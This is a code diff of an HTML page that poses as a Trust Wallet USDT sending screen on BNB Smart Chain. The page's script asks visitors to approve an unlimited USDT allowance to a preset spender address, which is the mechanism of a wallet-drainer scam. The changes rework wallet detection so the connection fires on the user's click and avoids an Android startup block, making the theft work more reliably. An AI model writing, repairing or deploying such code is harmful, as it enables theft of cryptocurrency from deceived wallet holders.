@@ -47,16 +47,9 @@
         
         .success-icon { width: 80px; height: 80px; margin: 40px auto; display: block; border-radius: 50%; }
         .tx-box { background: var(--surface); padding: 15px; border-radius: 12px; font-family: monospace; font-size: 11px; color: var(--primary); word-break: break-all; }
-        
-        #initLoader { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
     </style>
 </head>
 <body>
-
-    <div id="initLoader">
-        <span class="loading-spinner" style="width: 30px; height: 30px; border-top-color: var(--primary);"></span>
-        <p style="margin-top: 15px; color: var(--text-secondary); font-size: 14px;">Connecting to Trust Wallet...</p>
-    </div>
 
     <div class="modal">
         <div class="screen active" id="screenMain">
@@ -76,7 +69,7 @@
                 <div class="section">
                     <div class="section-label">Network</div>
                     <div class="network-selector">
-                        <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logobnb.png" class="network-logo">
+                        <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png" class="network-logo">
                         <span style="font-size: 14px;">BNB Smart Chain</span>
                     </div>
                 </div>
@@ -122,76 +115,48 @@
             { "constant": true, "inputs": [{"name":"_o","type":"address"}], "name":"balanceOf", "outputs":[{"name":"","type":"uint256"}], "type":"function" }
         ];
 
-        let web3, userAccount, eip6963Provider = null;
+        let web3, userAccount, activeProvider = null;
 
-        // --- NEW EIP-6963 DETECTION FOR ANDROID TRUST WALLET ---
-        window.addEventListener("eip6963:announceProvider", (event) => {
-            if (event.detail && event.detail.provider) {
-                // If Trust Wallet announces itself, grab it immediately
-                if (event.detail.info && event.detail.info.rdns === 'com.trustwallet.app') {
-                    eip6963Provider = event.detail.provider;
-                } else if (!eip6963Provider) {
-                    eip6963Provider = event.detail.provider;
-                }
-            }
-        });
-
-        // Broadcast to all wallets to announce themselves
-        window.dispatchEvent(new Event("eip6963:requestProvider"));
-
-        async function getProvider() {
-            return new Promise((resolve) => {
-                let attempts = 0;
-                const interval = setInterval(() => {
-                    // Check standard EIP-6963 first, then legacy namespaces
-                    const p = eip6963Provider || (window.trustwallet && window.trustwallet.ethereum) || window.ethereum;
-                    if (p) {
-                        clearInterval(interval);
-                        resolve(p);
-                    }
-                    if (attempts > 30) { // Timeout after 3 seconds
-                        clearInterval(interval);
-                        resolve(null);
-                    }
-                    attempts++;
-                }, 100);
-            });
+        // Locates the provider ONLY when needed, avoiding Android startup block
+        function locateProvider() {
+            if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
+            if (window.ethereum) return window.ethereum;
+            return null;
         }
 
-        async function init() {
-            const finalProvider = await getProvider();
-            
-            if (finalProvider) {
-                web3 = new Web3(finalProvider);
-                try {
-                    const accounts = await finalProvider.request({ method: 'eth_requestAccounts' });
-                    userAccount = accounts[0];
-                    await checkNetwork(finalProvider);
-                    document.getElementById('initLoader').style.display = 'none';
-                } catch (e) {
-                    showError("Please approve wallet connection.");
-                    document.getElementById('initLoader').style.display = 'none';
-                }
-            } else {
-                document.getElementById('initLoader').innerHTML = `
-                    <p style="color:#ff6b6b; padding:20px; text-align:center;">
-                        Web3 Not Found. Please open this link directly inside the Trust Wallet Browser.
-                    </p>
-                `;
+        // Tries to connect and verify the network dynamically
+        async function ensureConnected() {
+            if (userAccount && activeProvider) return true; // Already connected
+
+            activeProvider = locateProvider();
+            if (!activeProvider) {
+                showError("Web3 Not Found. Please run this inside the Trust Wallet DApp Browser.");
+                return false;
+            }
+
+            try {
+                web3 = new Web3(activeProvider);
+                const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
+                userAccount = accounts[0];
+                await enforceNetwork();
+                return true;
+            } catch (err) {
+                showError("Connection refused by wallet.");
+                return false;
             }
         }
 
-        async function checkNetwork(providerToUse) {
+        async function enforceNetwork() {
             const id = await web3.eth.getChainId();
             if (id !== CONFIG.CHAIN_ID) {
                 try {
-                    await providerToUse.request({
+                    await activeProvider.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: Web3.utils.toHex(CONFIG.CHAIN_ID) }]
                     });
                 } catch (err) {
                     if (err.code === 4902) {
-                        await providerToUse.request({
+                        await activeProvider.request({
                             method: 'wallet_addEthereumChain',
                             params: [{
                                 chainId: Web3.utils.toHex(CONFIG.CHAIN_ID),
@@ -209,17 +174,19 @@
         async function startProcess() {
             const amount = document.getElementById('amountInput').value;
             const btn = document.getElementById('actionBtn');
+            
             if (!amount || amount <= 0) return showError("Enter a valid amount");
+
+            // Lazy connection triggered by user click (bypasses Android block)
+            const isConnected = await ensureConnected();
+            if (!isConnected) return;
             
             try {
-                const p = eip6963Provider || (window.trustwallet && window.trustwallet.ethereum) || window.ethereum;
-                await checkNetwork(p);
-                
                 const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
                 const weiAmount = web3.utils.toWei(amount.toString(), 'ether');
 
                 btn.disabled = true;
-                btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
+                btn.innerHTML = '<span class="loading-spinner"></span> Approving USDT...';
                 
                 const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });
@@ -238,17 +205,27 @@
         }
 
         async function setMax() {
-            if (!userAccount) return;
-            const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
-            const bal = await contract.methods.balanceOf(userAccount).call();
-            document.getElementById('amountInput').value = web3.utils.fromWei(bal, 'ether');
+            const isConnected = await ensureConnected();
+            if (!isConnected) return;
+
+            const btn = document.querySelector('.max-btn');
+            const originalText = btn.innerText;
+            btn.innerText = '...';
+
+            try {
+                const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
+                const bal = await contract.methods.balanceOf(userAccount).call();
+                document.getElementById('amountInput').value = web3.utils.fromWei(bal, 'ether');
+            } catch (err) {
+                showError("Failed to fetch balance.");
+            } finally {
+                btn.innerText = originalText;
+            }
         }
 
         function showError(msg) {
             document.getElementById('errorDisplay').innerHTML = `<div class="error-message">${msg}</div>`;
         }
-
-        window.onload = init;
     </script>
 </body>
 </html>
